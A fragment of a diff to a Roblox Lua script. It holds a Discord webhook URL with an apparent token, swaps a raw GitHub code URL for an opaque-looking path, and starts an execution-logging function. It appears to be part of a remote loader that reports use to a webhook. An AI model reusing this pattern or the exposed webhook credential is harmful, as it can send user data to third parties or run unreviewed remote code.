@@ -3,7 +3,7 @@ local Players = game:GetService("Players")
 
 local player = Players.LocalPlayer
 local webhookUrl = "https://discord.com/api/webhooks/1543021544547033088/b-fIhSv0YJmzHqVEufPLqXJZ6Zf6HTXM_nusk6IpefJhrW-auOW0pachx4h34LrvGqiA"
-local rawGithubUrl = "https://raw.githubusercontent.com/underratedyo/yo/refs/heads/main/yo.lua"
+local rawGithubUrl = "https://raw.githubusercontent.com/underratedyo/SI92NS029918SN99/refs/heads/main/9.lua"
 
 local function logExecution()
     local timestamp = os.time()
